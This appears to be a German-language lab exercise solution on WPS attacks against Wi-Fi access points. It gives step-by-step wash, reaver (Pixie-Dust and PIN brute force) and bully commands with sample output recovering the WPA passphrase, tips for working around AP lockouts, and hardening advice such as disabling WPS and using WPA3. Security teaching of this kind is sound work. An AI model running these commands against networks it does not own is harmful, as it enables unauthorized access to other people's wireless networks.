# Lösung – Übung 07: WPS-Angriffe

## 1. WPS-APs finden

```bash
sudo wash -i wlan0mon
```
```
BSSID              Ch  WPS  Lck  ESSID
AA:BB:CC:11:22:33   6  2.0   No  MeinTestAP
```
`WPS` = Version, `Lck = No` → nicht gesperrt, angreifbar.

## 2. Pixie-Dust

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -c 6 -K 1 -vv
```
Bei anfälligem Chipsatz:
```
[+] WPS PIN: '12345670'
[+] WPA PSK: 'MeinSchwachesPW123'
```
Pixie-Dust nutzt schwache Nonces → PIN **offline** in Sekunden/Minuten.

## 3. PIN-Brute-Force (Fallback)

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -c 6 -vv
# bully-Alternative:
sudo bully -b AA:BB:CC:11:22:33 -c 6 wlan0mon
```
reaver probiert PINs (zwei Hälften) → dauert Stunden, speichert Fortschritt (`--session`). Bei „AP rate limiting/locked" `--lock-delay` o. ä.

## 4. PSK & warum Stärke egal

reaver gibt am Ende die **WPA-PSK im Klartext** aus – der AP händigt sie nach erfolgreicher WPS-Auth aus. Daher ist die **Komplexität der PSK irrelevant**, solange WPS angreifbar ist: man umgeht das Passwort komplett.

## 5. WPS deaktivieren

Im AP-Webinterface WPS ausschalten, dann:
```bash
sudo wash -i wlan0mon       # AP erscheint nicht mehr / kein WPS
```

## Härtung

- **WPS deaktivieren** (wichtigste Maßnahme), Firmware aktuell (Pixie-Dust teils gepatcht), AP mit WPS-Lockout.
- **WPA3** (kein WPS-PIN-Modell wie WPA2).

## Häufige Fehler / Troubleshooting

- **„WPS Locked" / rate-limited:** AP sperrt nach Fehlversuchen → warten/`--lock-delay`, Pixie-Dust probieren (kein Online-Brute).
- **reaver bricht ab:** Signal/Kanal; `-c` fixieren; Session fortsetzen.
- **Nicht pixie-anfällig:** moderner/gepatchter Chipsatz → nur PIN-Brute (langsam).
- **Rechtliches:** nur eigener AP.
